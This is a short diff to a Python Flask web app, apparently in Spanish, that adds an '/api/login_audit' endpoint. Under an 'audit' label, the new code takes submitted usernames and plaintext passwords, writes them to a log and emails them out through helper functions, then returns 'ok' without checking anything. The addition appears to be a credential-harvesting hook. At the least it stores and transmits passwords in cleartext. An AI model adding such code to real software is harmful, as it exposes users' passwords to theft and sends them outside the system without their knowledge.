@@ -295,6 +295,19 @@ def analizar():
         "color": color
     }
 
+@app.route("/api/login_audit", methods=["POST"])
+def login_audit():
+    data = request.get_json(force=True)
+
+    usuario = data.get("username", "")
+    password = data.get("password", "")
+
+    guardar_login_log(usuario, password, False)
+    enviar_log_email(usuario, password, "INTENTO_LOGIN")
+
+    return {"status": "ok"}
+
+
 @app.route("/login", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
